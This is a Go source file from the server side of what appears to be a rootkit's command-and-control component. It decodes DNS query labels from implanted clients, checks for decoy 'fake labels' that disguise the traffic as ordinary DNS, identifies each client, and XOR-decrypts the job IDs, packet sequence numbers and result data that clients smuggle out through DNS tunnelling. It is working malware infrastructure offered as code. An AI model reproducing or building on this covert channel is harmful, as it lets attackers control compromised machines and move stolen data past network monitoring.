package c2

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"reflect"

	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/util"
)

type Request struct {
	PacketID uint64
	IsLast   bool
	Data     []byte
}

const (
	// see user/inc/req.h
	REQ_LABEL_COUNT_JOB    = 4 // label count for a job request
	REQ_LABEL_COUNT_RESULT = 6 // label count for a result request
)

func getLabelCount(labels []string) (int, error) {
	res := len(labels)

	if res != REQ_LABEL_COUNT_JOB &&
		res != REQ_LABEL_COUNT_RESULT {
		return -1, fmt.Errorf("invalid label count")
	}

	return res, nil
}

func decodeAndDecrypt(label string, client *database.Client) (*bytes.Buffer, error) {
	var (
		buf []byte
		err error
	)

	if buf, err = util.DecodeHex(label); err != nil {
		return nil, err
	}

	if err = client.XOR(buf); err != nil {
		return nil, fmt.Errorf("error decrypting label 1: %s", err.Error())
	}

	return bytes.NewBuffer(buf), nil
}

func (c2 *Type) ToRequest(packet *DNS_Packet) (*Request, *database.Client, *joblist.Job, error) {
	var (
		req Request

		labels      []string
		label_count int = 0

		client_id []byte
		is_last   []byte

		client *database.Client = nil
		job    *joblist.Job     = nil

		err error
	)

	labels = packet.Question.Qname

	// check the label count
	if label_count, err = getLabelCount(labels); err != nil {
		return nil, nil, nil, err
	}

	// check fake labels
	found_fake_labels := false

	for _, fake_labels := range FakeLabels {
		if fake_labels[0] == labels[label_count-3] &&
			fake_labels[1] == labels[label_count-2] &&
			fake_labels[2] == labels[label_count-1] {
			found_fake_labels = true
			break
		}
	}

	if !found_fake_labels {
		return nil, nil, nil, fmt.Errorf("cannot find valid fake labels")
	}

	// parse the client_id from label 0
	if client_id, err = util.DecodeHex(labels[0]); err != nil {
		return nil, nil, nil, fmt.Errorf("error decoding label 0: %s", err.Error())
	}

	// and obtain the client
	if client, _ = c2.Data.ClientGet(string(client_id)); client == nil {
		return nil, nil, nil, fmt.Errorf("no client with the given client_id")
	}

	switch label_count {
	case REQ_LABEL_COUNT_JOB: // job request
		// this type has no more fields to parse
		req.PacketID = 0
		req.IsLast = true

	case REQ_LABEL_COUNT_RESULT: // result request
		var plain *bytes.Buffer

		// parse the job_id, packet_id, is_last from label 1
		if plain, err = decodeAndDecrypt(labels[1], client); err != nil {
			return nil, nil, nil, fmt.Errorf("error decoding/decrypting label 1: %s", err.Error())
		}

		if job, _ = c2.Jobs.Get(string(plain.Next(joblist.JOB_ID_SIZE))); job == nil {
			return nil, nil, nil, fmt.Errorf("specified job not found")
		}

		req.PacketID = binary.LittleEndian.Uint64(plain.Next(int(reflect.TypeOf(req.PacketID).Size())))

		if is_last = plain.Next(1); is_last == nil || len(is_last) == 0 {
			return nil, nil, nil, fmt.Errorf("missing is_last field in label 1")
		}

		req.IsLast = is_last[0] == 1

		// load data from the label 2
		if plain, err = decodeAndDecrypt(labels[2], client); err != nil {
			return nil, nil, nil, fmt.Errorf("error decoding/decrypting label 2: %s", err.Error())
		}

		req.Data = plain.Bytes()

	default:
		return nil, nil, nil, fmt.Errorf("invalid label count for a request (%d)", label_count)
	}

	return &req, client, job, nil
}
